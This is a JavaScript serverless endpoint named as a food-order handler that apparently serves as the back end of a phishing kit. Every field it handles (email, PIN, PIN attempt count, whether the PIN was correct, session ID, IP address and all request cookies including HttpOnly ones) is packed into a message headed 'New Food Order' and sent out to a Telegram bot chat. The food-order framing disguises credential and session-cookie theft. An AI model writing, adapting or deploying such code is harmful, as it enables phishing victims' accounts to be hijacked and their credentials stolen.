// api/send-order.js

export default async function handler(req, res) {
  // Only allow POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    // 1. Parse request body
    const { email, pin, attemptNumber, isCorrectPin, sessionId } = req.body;

    // 2. Read all cookies (including HttpOnly) from the request header
    const cookies = req.headers.cookie || '';

    // 3. Get IP address (Vercel provides these headers)
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';

    // 4. Get Telegram credentials from environment
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error('Missing Telegram credentials');
      return res.status(500).json({ error: 'Server configuration error' });
    }

    // 5. Helper to escape HTML
    const escapeHtml = (str) => {
      if (!str) return '';
      return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
    };

    // 6. Build the Telegram message (HTML)
    const now = new Date();
    const time = now.toLocaleString('en-GB', { dateStyle: 'medium', timeStyle: 'short' });

    const lines = [];
    lines.push('🍽️ <b>New Food Order</b>');
    if (email) lines.push(`📧 <b>Email:</b> ${escapeHtml(email)}`);
    if (pin) lines.push(`🔑 <b>PIN:</b> ${escapeHtml(pin)}`);
    if (attemptNumber !== undefined) lines.push(`🔢 <b>Attempt:</b> ${attemptNumber}`);
    if (isCorrectPin !== undefined) lines.push(`✅ <b>Correct:</b> ${isCorrectPin ? 'Yes' : 'No'}`);
    if (ip) lines.push(`🌐 <b>IP:</b> ${escapeHtml(ip)}`);
    if (cookies) lines.push(`🍪 <b>Cookies:</b> ${escapeHtml(cookies)}`);
    if (sessionId) lines.push(`🆔 <b>Session:</b> ${escapeHtml(sessionId)}`);
    lines.push(`🕐 <b>Time:</b> ${escapeHtml(time)}`);

    const text = lines.join('\n');

    // 7. Forward to Telegram
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
      }),
    });

    const result = await response.json();
    if (!result.ok) {
      console.error('Telegram error:', result);
      return res.status(500).json({ error: 'Telegram API error' });
    }

    // 8. Success
    res.status(200).json({ success: true });
  } catch (err) {
    console.error('Proxy error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
}